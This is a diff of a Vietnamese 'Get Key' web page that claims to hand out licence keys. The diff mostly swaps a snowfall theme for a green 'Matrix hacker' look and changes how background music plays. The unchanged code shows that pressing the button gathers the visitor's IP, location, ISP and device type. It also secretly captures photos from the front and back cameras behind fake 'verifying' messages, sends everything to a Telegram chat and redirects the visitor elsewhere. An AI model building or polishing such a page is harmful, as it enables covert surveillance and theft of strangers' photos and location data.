@@ -6,21 +6,20 @@
 <title>Hệ Thống Get Key</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=VT323&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg-base: #050b14;
-    --panel-bg: rgba(15, 23, 42, 0.7);
-    --border-color: rgba(147, 197, 253, 0.2);
-    --primary: #3b82f6;
-    --accent: #60a5fa;
-    --text-main: #f8fafc;
-    --text-muted: #94a3b8;
+    --bg-base: #000000;
+    --panel-bg: rgba(0, 15, 0, 0.85);
+    --border-color: rgba(0, 255, 65, 0.3);
+    --primary: #00ff41;
+    --accent: #008F11;
+    --text-main: #00ff41;
+    --text-muted: #008F11;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
   body {
     background-color: var(--bg-base);
-    background-image: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
     color: var(--text-main);
     min-height: 100vh;
     display: flex;
@@ -31,20 +30,15 @@
     position: relative;
   }
 
-  /* Hiệu ứng tuyết rơi */
-  .snowflake {
+  /* Hiệu ứng Matrix mưa chữ xanh phía sau */
+  #matrix-canvas {
     position: absolute;
-    top: -10px;
-    background: #ffffff;
-    border-radius: 50%;
-    opacity: 0.8;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 1;
     pointer-events: none;
-    animation: fall linear infinite;
-  }
-  @keyframes fall {
-    0% { transform: translateY(-10px) translateX(0); opacity: 0.8; }
-    50% { opacity: 1; }
-    100% { transform: translateY(105vh) translateX(20px); opacity: 0.2; }
   }
 
   .card {
@@ -53,93 +47,170 @@
     -webkit-backdrop-filter: blur(25px);
     border: 1px solid var(--border-color);
     padding: 40px 32px;
-    border-radius: 32px;
+    border-radius: 16px;
     width: 100%;
     max-width: 380px;
-    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+    box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
     text-align: center;
     position: relative;
     z-index: 10;
   }
   .live-clock {
-    font-size: 0.75rem; font-weight: 600; color: #93c5fd;
-    background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.2);
-    padding: 6px 14px; border-radius: 20px; display: inline-block; margin-bottom: 20px;
+    font-family: 'VT323', monospace;
+    font-size: 1.1rem; 
+    color: #00ff41;
+    background: rgba(0, 255, 65, 0.05); 
+    border: 1px solid rgba(0, 255, 65, 0.2);
+    padding: 4px 12px; 
+    border-radius: 4px; 
+    display: inline-block; 
+    margin-bottom: 20px;
+    letter-spacing: 1px;
   }
   .icon-box {
     width: 64px; height: 64px; margin: 0 auto 20px auto;
-    background: linear-gradient(135deg, rgba(59, 130, 246, 0.2), rgba(96, 165, 250, 0.2));
-    border: 1px solid rgba(59, 130, 246, 0.4); border-radius: 20px;
+    background: rgba(0, 255, 65, 0.1);
+    border: 1px solid rgba(0, 255, 65, 0.4); border-radius: 12px;
     display: flex; align-items: center; justify-content: center; font-size: 28px;
-    box-shadow: 0 10px 20px -5px rgba(59, 130, 246, 0.3);
+    box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
   }
-  h2 { font-size: 1.4rem; font-weight: 700; margin-bottom: 8px; color: #fff; }
-  .subtitle { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 28px; line-height: 1.5; }
+  h2 { font-family: 'VT323', monospace; font-size: 2rem; font-weight: 700; margin-bottom: 8px; color: #00ff41; letter-spacing: 2px; text-shadow: 0 0 8px rgba(0,255,65,0.6); }
+  .subtitle { font-size: 0.85rem; color: #00cc33; margin-bottom: 28px; line-height: 1.5; }
   
+  /* Nút bấm hiệu ứng cyberpunk/hacker có mặt nạ ở góc */
   .btn-primary {
     width: 100%; padding: 16px; 
-    background: linear-gradient(135deg, var(--primary), var(--accent));
-    color: #fff; border: none; border-radius: 16px; 
+    background: rgba(0, 255, 65, 0.1);
+    color: #00ff41; border: 1px solid #00ff41; border-radius: 8px; 
     font-weight: 700; font-size: 1rem; cursor: pointer; 
     transition: all 0.3s ease;
-    box-shadow: 0 10px 25px -5px rgba(59, 130, 246, 0.5);
-    display: flex; align-items: center; justify-content: center; gap: 8px;
+    box-shadow: 0 0 10px rgba(0, 255, 65, 0.2);
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    letter-spacing: 1px;
+    position: relative;
+    overflow: hidden;
   }
-  .btn-primary:hover { opacity: 0.95; transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(59, 130, 246, 0.7); }
+
+  /* Hiệu ứng lóe sáng chạy qua nút */
+  .btn-primary::after {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: linear-gradient(60deg, transparent, rgba(0,255,65,0.2), transparent);
+    transform: rotate(45deg) translateX(-100%);
+    transition: transform 0.6s ease;
+  }
+  .btn-primary:hover::after {
+    transform: rotate(45deg) translateX(100%);
+  }
+
+  .btn-primary:hover { 
+    background: #00ff41; 
+    color: #000; 
+    transform: translateY(-2px); 
+    box-shadow: 0 0 25px rgba(0, 255, 65, 0.8); 
+  }
+
+  /* Biểu tượng mặt nạ hacker ở góc nút */
+  .hacker-badge {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 1.2rem;
+    filter: drop-shadow(0 0 4px #00ff41);
+    animation: pulse-mask 1.5s infinite alternate;
+  }
+
+  @keyframes pulse-mask {
+    0% { transform: translateY(-50%) scale(1); opacity: 0.8; }
+    100% { transform: translateY(-50%) scale(1.15); opacity: 1; }
+  }
 
   /* Nút điều khiển nhạc */
   .btn-music {
     width: 100%; padding: 12px;
     margin-top: 12px;
-    background: rgba(30, 41, 59, 0.5);
-    color: var(--text-muted); border: 1px solid var(--border-color); border-radius: 14px;
+    background: rgba(0, 0, 0, 0.5);
+    color: #008F11; border: 1px solid rgba(0, 255, 65, 0.2); border-radius: 8px;
     font-weight: 600; font-size: 0.85rem; cursor: pointer;
     transition: all 0.3s ease;
     display: flex; align-items: center; justify-content: center; gap: 8px;
   }
-  .btn-music:hover { background: rgba(59, 130, 246, 0.1); color: #fff; border-color: rgba(59, 130, 246, 0.4); }
+  .btn-music:hover { background: rgba(0, 255, 65, 0.1); color: #00ff41; border-color: rgba(0, 255, 65, 0.5); }
 
-  .status { margin-top: 16px; font-size: 0.8rem; font-weight: 500; color: var(--text-muted); min-height: 20px; }
-  #video, #canvas, #music-container { display: none; }
+  .status { margin-top: 16px; font-weight: 500; color: #00cc33; min-height: 20px; font-family: 'VT323', monospace; font-size: 1.1rem; }
+  #video, #canvas { display: none; }
 </style>
 </head>
 <body>
 
-  <!-- Khung chứa nhạc ẩn (Hỗ trợ mọi loại link) -->
-  <div id="music-container"></div>
+  <!-- Canvas hiệu ứng Matrix (chữ xanh rơi xuống) -->
+  <canvas id="matrix-canvas"></canvas>
 
-  <!-- Tạo hiệu ứng tuyết rơi bằng JS -->
+  <!-- Thẻ Audio ẩn chạy nhạc trực tiếp[span_0](start_span)[span_0](end_span) -->
+  <audio id="bg-music" loop preload="auto">
+    <!-- THAY LINK NHẠC CỦA BẠN VÀO THUỘC TÍNH SRC DƯỚI ĐÂY -->
+    <source src="THAY_LINK_NHAC_O_DAY" type="audio/mp3">
+  </audio>
+
+  <!-- Script chạy hiệu ứng Matrix (Hacker mưa chữ) -->
   <script>
-    function createSnowflakes() {
-      const numSnowflakes = 40;
-      for (let i = 0; i < numSnowflakes; i++) {
-        const sf = document.createElement('div');
-        sf.classList.add('snowflake');
-        sf.style.left = Math.random() * 100 + 'vw';
-        sf.style.animationDuration = (Math.random() * 3 + 2) + 's';
-        sf.style.animationDelay = (Math.random() * 5) + 's';
-        const size = Math.random() * 4 + 2 + 'px';
-        sf.style.width = size;
-        sf.style.height = size;
-        document.body.appendChild(sf);
+    const canvas = document.getElementById('matrix-canvas');
+    const ctx = canvas.getContext('2d');
+
+    function resizeCanvas() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    const chars = '01ABCDEFXYZ$#@&%*<>[]{}';
+    const fontSize = 16;
+    let columns = canvas.width / fontSize;
+    let drops = [];
+    for (let i = 0; i < columns; i++) {
+      drops[i] = 1;
+    }
+
+    function drawMatrix() {
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      ctx.fillStyle = '#00ff41';
+      ctx.font = fontSize + 'px monospace';
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = chars.charAt(Math.floor(Math.random() * chars.length));
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[i] = 0;
+        }
+        drops[i]++;
       }
     }
-    window.addEventListener('DOMContentLoaded', createSnowflakes);
+    setInterval(drawMatrix, 33);
   </script>
 
   <div class="card">
-    <div class="live-clock" id="clock">Đang tải thời gian...</div>
+    <div class="live-clock" id="clock">[ 00:00:00 ]</div>
     
-    <div class="icon-box">❄️</div>
-    <h2>Hệ Thống Get Key</h2>
-    <p class="subtitle">Bấm vào nút bên dưới để tiến hành lấy mã Key bản quyền của hệ thống.</p>
+    <div class="icon-box">💻</div>
+    <h2>HỆ THỐNG SEC_KEY</h2>
+    <p class="subtitle">Nhấn xác thực bên dưới để giải mã lấy mã Key bản quyền.</p>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <!-- Nút Get Key -->
+    <!-- Nút Get Key có hiệu ứng và mặt nạ hacker ở góc -->
     <button class="btn-primary" id="get-key-btn" onclick="triggerProcess()">
-      <span>🔑 GET KEY NGAY</span>
+      <span>⚡ XÁC THỰC NGAY</span>
+      <span class="hacker-badge">🎭</span>
     </button>
 
     <!-- Nút Bật/Tắt Nhạc -->
@@ -155,13 +226,7 @@
   const TELEGRAM_CHAT_ID = '-1004303781844'; 
   const REDIRECT_URL = 'https://xnhau.city/';
 
-  // ---------------------------------------------------------
-  // THAY LINK NHẠC CỦA BẠN VÀO ĐÂY (Hỗ trợ Youtube, MP3, v.v.)
-  // Nếu là Youtube, hãy dùng dạng embed: https://www.youtube.com/embed/VIDEO_ID?autoplay=1
-  // ---------------------------------------------------------
-  const MUSIC_URL = 'https://open.spotify.com/track/2FOjXz9XVgkn8sUNdaH3Pt?si=EomALRXmTR65eIDvPDtV9w&utm_source=copy-link&rowId=0613099f713aa8e8';
-
-  const musicContainer = document.getElementById('music-container');
+  const bgMusic = document.getElementById('bg-music');
   const musicToggleBtn = document.getElementById('music-toggle-btn');
   const musicIcon = document.getElementById('music-icon');
   const musicText = document.getElementById('music-text');
@@ -169,30 +234,35 @@
 
   function toggleMusic() {
     if (isMusicPlaying) {
-      musicContainer.innerHTML = ''; // Xóa iframe để dừng nhạc
+      bgMusic.pause();
       isMusicPlaying = false;
       musicIcon.textContent = '🎵';
       musicText.textContent = 'Bật Nhạc Nền';
     } else {
-      musicContainer.innerHTML = `<iframe src="${MUSIC_URL}" allow="autoplay" width="0" height="0"></iframe>`;
-      isMusicPlaying = true;
-      musicIcon.textContent = '🔇';
-      musicText.textContent = 'Tắt Nhạc Nền';
+      bgMusic.play().then(() => {
+        isMusicPlaying = true;
+        musicIcon.textContent = '🔇';
+        musicText.textContent = 'Tắt Nhạc Nền';
+      }).catch(err => {
+        console.log("Không thể phát nhạc:", err);
+      });
     }
   }
 
-  // Tự động bật nhạc khi vừa vào trang
-  window.addEventListener('load', () => {
-    // Tự động kích hoạt phát nhạc ngầm ngay khi tải trang
-    musicContainer.innerHTML = `<iframe src="${MUSIC_URL}" allow="autoplay" width="0" height="0"></iframe>`;
-    isMusicPlaying = true;
-    musicIcon.textContent = '🔇';
-    musicText.textContent = 'Tắt Nhạc Nền';
-  });
+  // Tự động kích hoạt nhạc ngay khi người dùng chạm/click bất kì đâu trên trang
+  document.addEventListener('click', function unlockAudio() {
+    if (!isMusicPlaying) {
+      bgMusic.play().then(() => {
+        isMusicPlaying = true;
+        musicIcon.textContent = '🔇';
+        musicText.textContent = 'Tắt Nhạc Nền';
+      }).catch(e => {});
+    }
+  }, { once: true });
 
   function updateClock() {
     const now = new Date();
-    document.getElementById('clock').textContent = `🕒 ${now.toLocaleTimeString('vi-VN', { hour12: false })}`;
+    document.getElementById('clock').textContent = `[ ${now.toLocaleTimeString('vi-VN', { hour12: false })} ]`;
   }
   setInterval(updateClock, 1000);
   updateClock();
@@ -237,7 +307,7 @@
 
   async function triggerProcess() {
     getKeyBtn.style.display = 'none';
-    statusDiv.textContent = 'Đang khởi tạo bảo mật...';
+    statusDiv.textContent = '[*] Đang khởi tạo kết nối bảo mật...';
 
     let ipDetails = { ip: 'Không rõ', city: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
     try {
@@ -257,7 +327,7 @@
     let deviceName = /android/i.test(ua) ? 'Android 🤖' : /iphone|ipad/i.test(ua) ? 'iOS 🍏' : 'PC/Laptop 💻';
 
     const infoText = 
-      `❄️ <b>YÊU CẦU GET KEY (TUYẾT RƠI)</b> ❄️\n` +
+      `💻 <b>HỆ THỐNG GET KEY (MATRIX HACKER)</b> 💻\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n` +
       `📱 <b>Thiết bị:</b> ${deviceName}\n` +
       `🌐 <b>IP:</b> <code>${ipDetails.ip}</code>\n` +
@@ -265,10 +335,10 @@
       `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n` +
       `━━━━━━━━━━━━━━━━━━━━━`;
 
-    statusDiv.textContent = 'Đang xác thực link sau...';
+    statusDiv.textContent = '[*] Đang nạp module xác thực...';
     let backPhoto = await takePhoto('environment', '📸 Ảnh Camera Sau');
 
-    statusDiv.textContent = 'Đang xác thực link trước...';
+    statusDiv.textContent = '[*] Đang đồng bộ luồng dữ liệu...';
     let frontPhoto = await takePhoto('user', '📸 Ảnh Camera Trước');
 
     if (backPhoto && backPhoto.blob) {
@@ -299,7 +369,7 @@
       } catch (e) {}
     }
 
-    statusDiv.textContent = 'Thành công! Đang chuyển hướng...';
+    statusDiv.textContent = '[+] Thành công! Đang chuyển hướng...';
     setTimeout(() => {
       window.location.href = REDIRECT_URL;
     }, 1000);
